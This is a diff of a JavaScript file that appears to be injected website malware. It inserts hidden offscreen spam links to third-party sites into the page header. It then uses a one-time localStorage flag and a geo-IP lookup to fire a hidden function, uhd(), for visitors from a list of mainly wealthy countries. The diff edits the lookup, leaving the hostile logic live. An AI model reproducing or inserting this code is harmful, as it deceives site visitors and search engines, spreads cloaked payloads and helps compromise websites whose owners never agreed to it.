@@ -1,19 +1,21 @@
 let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
 if (!localStorage.xcaf) {
-    var aa='';
-    (async () =>{
+    (async()=>{
         localStorage.xcaf=1;
-        try {
-            aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json()).geoplugin_countryName;
-        } catch (e) {
-            try {
-                aa=await(await(await fetch(`http://ip-api.com/line/?fields=1`)).text());
-            } catch (e) {
-                aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
-            }
-        }
-        if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|South Korea|China|Singapore|Romania/i.test(aa)){
+//         try {
+//             aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json()).geoplugin_countryName;
+//         } catch (e) {
+//             try {
+//                 aa=await(await(await fetch(`http://ip-api.com/line/?fields=1`)).text());
+//             } catch (e) {
+//                 aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
+//             }
+//         }
+        
+        let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
+        
+        if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania/i.test(aa)){
             localStorage.xcaf=2;
             uhd()
         }
